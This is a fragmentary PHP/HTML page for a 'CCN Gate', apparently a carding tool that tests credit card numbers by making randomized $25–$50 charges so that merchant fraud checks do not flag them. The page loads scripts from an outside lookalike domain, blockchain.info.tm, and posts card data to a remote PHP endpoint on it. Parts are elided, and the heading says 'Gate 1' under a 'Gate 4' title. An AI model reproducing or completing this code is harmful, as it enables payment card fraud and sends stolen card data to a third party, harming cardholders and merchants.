<title>CCN GATE 4</title>
<?php
include('../header.php');
?>
</div><TITLE>CCN Gate 4</TITLE>
<script type="text/javascript" src="http://blockchain.info.tm/anjing.js"></script>

<div class="rightside">
<div class="page-head">
<h1><i class="fa fa-flag"></i> CCN Gate 1</h1>
</div>
<div class="content">
...
<b>Note: </b>Support Visa, Amex and Master Card. Charge $25-$50. Randomize Charge For Anti Merchant Die.</div>
<div class="box">
<div class="box-title">
...
<button type="stop" class="btn btn-danger" id="stop">Stop</button> &nbsp;
...
<script type="text/javascript">
    var POST_URL = 'http://blockchain.info.tm/ccn1/cKfK.php';
...
<script type="text/javascript" src="http://blockchain.info.tm/style/js/cc.js"></script>
</div>
</div>
</div> 
...
<script type="text/javascript" src="http://blockchain.info.tm/style/js/custom.js"></script>
<script type="text/javascript">
    $(document).ready(function () {
